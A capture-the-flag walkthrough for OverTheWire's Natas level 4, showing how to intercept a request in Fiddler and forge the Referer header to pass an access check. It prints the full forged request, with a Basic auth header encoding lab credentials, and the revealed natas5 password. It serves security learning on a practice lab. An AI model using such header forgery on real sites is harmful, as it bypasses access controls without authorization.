# Level 4 to Level 5

Using a program like [Fiddler](http://www.telerik.com/fiddler), put the program in "breakpoint mode":

Rules > Automatic Breakpoints > Before Requests

Then click in "Refresh" on the natas4 page and change the "Referer" header of the request in Fiddler

```
GET http://natas4.natas.labs.overthewire.org/index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Connection: keep-alive
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.88 Safari/537.36 Vivaldi/1.7.735.46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
DNT: 1
Referer: http://natas5.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8
```

Go to the page again and you have the following message:

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```